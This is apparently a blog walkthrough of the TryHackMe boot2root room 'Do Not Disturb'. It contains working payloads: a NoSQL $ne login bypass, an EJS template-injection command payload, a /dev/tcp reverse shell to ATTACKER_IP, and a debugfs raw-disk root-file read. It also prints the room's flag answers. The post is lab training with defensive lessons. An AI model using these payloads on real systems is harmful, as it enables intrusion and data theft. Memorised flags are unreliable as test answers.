---
title: "Do Not Disturb"
description: "A warm nedb session bypass opens the Byte Lotus staff console, an EJS preview template gives RCE as poolside, and a localhost Node inspector plus the disk group expose the root flag."
difficulty: "Easy"
tags: ["TryHackMe", "Hacker Holidays", "Boot2Root", "Web", "NoSQL Injection", "EJS SSTI", "Node.js", "Privilege Escalation", "Disk Group"]
date: "2026-08-02"
---

## Overview

Do Not Disturb is the Day 7 boot2root room from TryHackMe's Hacker Holidays 2026 series. The app is "Byte Lotus — Poolside", a small Node.js/Express staff console behind a login page. The intended path is a clean chain of trust failures: a NoSQL operator bypass logs in as a staff attendant, an EJS template preview executes server-side JavaScript, a local Node inspector exposes code execution as another service user, and that service user's membership in the `disk` group is enough to read `/root/root.txt` directly from the block device.

The local room folder contained only `nmap.txt` and `dir.txt` — no screenshots, no flags, and no exploit notes. The walkthrough below keeps the local scan evidence as the source of truth for enumeration and uses published writeups for the exploit details and flag values. The terminal screenshots come from the Kevinovitz writeup credited in References; the two diagrams are original.

![Diagram of the Do Not Disturb attack chain](/assets/screenshots/donotdisturb/attack-chain.svg)

## Room Information

| Field | Value |
|-------|-------|
| Platform | TryHackMe — Hacker Holidays 2026, Day 7 |
| Room | Do Not Disturb |
| Difficulty | Easy |
| Category | Boot2Root / Web |
| Target | `10.49.191.133` at scan time (instance-specific) |
| Open ports | 22, 80 |
| Services | OpenSSH 9.6p1, Node.js / Express |
| Web title | Byte Lotus &mdash; Poolside |
| Auth bypass | nedb/Mongo-style `$ne` operator on the login form |
| RCE sink | EJS template preview in the staff console |
| Foothold user | `poolside` (uid 996) |
| Privilege escalation | Node `--inspect` on localhost, then `disk` group raw read |
| Flags | User and root |

## Enumeration

### Service Scan

The local nmap scan was run on 2 August 2026:

```bash
nmap -sV -sC -oN nmap.txt 10.49.191.133
```

```text
# Nmap 7.98 scan initiated Sun Aug  2 22:53:53 2026
Nmap scan report for 10.49.191.133
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 74:48:ac:e7:ba:7b:ef:be:82:f8:6b:8b:e2:8b:f6:c5 (ECDSA)
|_  256 5c:61:b2:c7:8b:91:53:cf:35:8b:18:f3:af:40:cd:24 (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title: Byte Lotus &mdash; Poolside
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The attack surface is small: SSH and a single Express application. The web title and the room name point at a hotel staff workflow rather than a public marketing site, so authenticated staff features are the natural place to look.

![Nmap scan showing SSH and the Byte Lotus Poolside Express app](/assets/screenshots/donotdisturb/nmap.png)

### Content Discovery

The local `dir.txt` captured two interesting responses:

```text
logout              (Status: 302) [Size: 23] [--> /]
staff               (Status: 403) [Size: 1547]
```

`/logout` redirecting to `/` confirms a session-aware app. `/staff` returning `403` is more interesting than a `404`: the route exists, but the current visitor is not allowed to use it. A published gobuster run against common paths also found the expected public routes such as `/` and `/login`.

![Gobuster content discovery showing staff-related routes](/assets/screenshots/donotdisturb/gobuster.png)

![The staff page returning 403 before authentication](/assets/screenshots/donotdisturb/staff-forbidden.png)

## Initial Access — NoSQL Login Bypass

The login form accepts a username and password. Ordinary SQL injection payloads do not help because the backend is not using a SQL query in that shape. The stack hint matters: Express applications often use MongoDB-style document queries, and lightweight Node apps sometimes use **nedb**, which supports a subset of Mongo operators.

If the application builds a query like this:

```js
db.findOneAsync({ username: req.body.username, password: req.body.password })
```

and the body parser accepts nested objects, then a password of `{"$ne":"1"}` means "password is not equal to 1". For a known staff username, that can match the account without knowing the real password.

The Kevinovitz writeup demonstrates this with `curl`, asking for a session cookie and posting a nested `password[$ne]` field:

```bash
curl http://TARGET/login -i -s -c cookies.txt \
  --data 'username=attendant&password[$ne]=1'
```

![Curl request using a NoSQL $ne operator to obtain a staff session cookie](/assets/screenshots/donotdisturb/nosql-bypass.png)

A successful response sets a `connect.sid` cookie. Adding that cookie to the browser session and visiting `/staff` returns the staff console instead of the earlier 403.

![The connect.sid cookie added in the browser](/assets/screenshots/donotdisturb/staff-session.png)

![The staff console after the NoSQL authentication bypass](/assets/screenshots/donotdisturb/staff-console.png)

The important detail is not just "NoSQL injection works". The bypass lands on the **staff** account. A random guest account would authenticate but still not have the role needed for `/staff`, which is why targeting `attendant` matters.

## RCE — EJS Server-Side Template Injection

The staff console includes a template preview feature. The page tells the user that EJS templates can be used to personalise messages. That is a dangerous convenience: EJS does not merely substitute placeholders, it evaluates JavaScript inside template tags.

A harmless arithmetic probe confirms evaluation:

```ejs
<%= 7 * 7 %>
```

![EJS template evaluating 7*7 in the preview](/assets/screenshots/donotdisturb/ssti.png)

If the preview returns `49`, the server is executing the template rather than displaying it. From there, Node's `child_process` API can run operating system commands:

```ejs
<%= process.mainModule.require('child_process').execSync('id').toString() %>
```

![EJS template injection executing id on the server](/assets/screenshots/donotdisturb/rce.png)

Published writeups show this executes as `poolside` (uid 996). To convert the proof of concept into an interactive shell, start a listener and submit a reverse shell payload through the same template field:

```bash
nc -lvnp 1337
```

```ejs
<%= process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1"') %>
```

![Reverse shell caught from the EJS template injection](/assets/screenshots/donotdisturb/shell.png)

Once the shell lands, the user flag is in the `poolside` home directory:

```bash
cat /home/poolside/user.txt
```

![The user flag read from /home/poolside/user.txt](/assets/screenshots/donotdisturb/user-flag.png)

```text
THM{w4rm_s3ss10n_h1j4ck3d}
```

## Privilege Escalation — Node Inspector to Disk Group

The local evidence stops at the web foothold, but two independent public writeups agree on the post-exploitation path. The key finding is a Node process started with the V8 inspector bound to localhost:

```bash
ps -ef | grep node
ss -ltnp
```

A representative process looks like:

```text
pipelinesvc ... node --inspect=127.0.0.1:9229 processor.js
```

`--inspect` exposes the Chrome DevTools Protocol. Anyone who can reach that port can ask the Node process to evaluate JavaScript in its own context. Because the port is bound to `127.0.0.1`, it is not reachable from the internet — but it *is* reachable from the shell already obtained on the box. Localhost is a network location, not an authentication boundary.

![Privilege escalation path from Node inspector to disk-group file read](/assets/screenshots/donotdisturb/privesc-path.svg)

The debugger endpoint returns a WebSocket URL:

```bash
curl -s http://127.0.0.1:9229/json
```

Connecting to that WebSocket and sending a `Runtime.evaluate` message runs code as the user owning the Node process, `pipelinesvc`. A minimal client can be written in Node itself, since modern Node includes a global `WebSocket` implementation. The evaluated expression can call `require('child_process').execSync(...)`, giving command execution as `pipelinesvc`.

After pivoting, `id` reveals the important group:

```text
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

The `disk` group is effectively raw storage access. Members can read block devices, which means they can read files through the filesystem metadata without going through normal file permissions. The root flag can therefore be read with `debugfs`:

```bash
DEV=$(findmnt -no SOURCE /)
debugfs -R "cat /root/root.txt" "$DEV"
```

This does not produce a full interactive root shell; it produces direct access to the data that root owns. In a CTF, that is enough. In a real system, it is just as bad.

```text
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

## Flags

The local room folder did not include flag files. Both values below are corroborated by the Kevinovitz and HackerNoon writeups.

| Flag | Location / method | Value |
|------|--------------------|-------|
| User | `/home/poolside/user.txt` | `THM{w4rm_s3ss10n_h1j4ck3d}` |
| Root | Read from `/root/root.txt` via `debugfs` on the root device | `THM{r4w_d1sk_4cc3ss_w4s_t00_much}` |

## Commands Used

| Command | Purpose |
|---------|---------|
| `nmap -sV -sC -oN nmap.txt TARGET` | Identify SSH and the Express web service |
| `gobuster dir -u http://TARGET -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 20` | Discover `/staff`, `/login`, `/logout`, and other routes |
| `curl http://TARGET/login -i -s -c cookies.txt --data 'username=attendant&password[$ne]=1'` | Bypass login with a nedb/Mongo-style `$ne` operator |
| `<%= 7 * 7 %>` | Confirm EJS template evaluation in the staff preview |
| `<%= process.mainModule.require('child_process').execSync('id').toString() %>` | Prove command execution through EJS SSTI |
| `nc -lvnp 1337` | Catch the reverse shell |
| `cat /home/poolside/user.txt` | Read the user flag |
| `ps -ef \| grep node` | Find Node processes, including inspector-enabled services |
| `ss -ltnp` | Confirm the local debugger port |
| `curl -s http://127.0.0.1:9229/json` | Enumerate Node inspector targets |
| `DEV=$(findmnt -no SOURCE /)` | Identify the root block device |
| `debugfs -R "cat /root/root.txt" "$DEV"` | Read the root flag through raw disk access |

## Lessons Learned

**`403` is an invitation to understand authorization, not a dead end.** A forbidden staff page means the route exists and the application already has a concept of privileged users. The next question is how that privilege is granted.

**Operator injection is not SQL injection.** When a backend expects objects, passing `password[$ne]=1` or `password[$gt]=""` can change query semantics. Input validation must enforce types, not just escape characters.

**EJS preview features are code execution until proven otherwise.** Template engines that evaluate expressions are powerful for developers and dangerous for users. Untrusted templates should never reach `ejs.render` without a sandboxing strategy — and in most apps, the safer answer is to avoid user-controlled templates entirely.

**Localhost services are part of the attack surface after foothold.** A debug port bound to `127.0.0.1` is invisible to an external nmap scan, but fully reachable to any code running on the host.

**The `disk` group is equivalent to broad read access.** Raw block-device access bypasses filesystem permissions. Service accounts should not be given `disk` unless there is an extremely specific and controlled operational reason.

**Post-exploitation should start with process and socket enumeration.** `ps`, `ss`, environment files, service configs, and group membership often reveal a cleaner path than kernel exploits.

## References

- [TryHackMe — Do Not Disturb (Hacker Holidays 2026, Day 7)](https://tryhackme.com/room/hh-donotdisturb-84a45644)
- [TryHackMe — Hacker Holidays](https://tryhackme.com/hackerholidays)
- [Kevinovitz — Hh donotdisturb 84a45644](https://kevinovitz.github.io/TryHackMe_Writeups/hh-donotdisturb-84a45644/hh-donotdisturb-84a45644/) — source of the terminal screenshots used in this post
- [Lorenzo Regalado — TryHackMe Hacker Holidays Walkthrough](https://hackernoon.com/tryhackme-hacker-hollidays-walkthrough)
- [OWASP — NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [OWASP — Server-Side Template Injection](https://owasp.org/www-community/attacks/Server-Side_Template_Injection)
- [Node.js — Debugger / Inspector Security](https://nodejs.org/en/learn/getting-started/debugging)
- [man7 — debugfs(8)](https://man7.org/linux/man-pages/man8/debugfs.8.html)
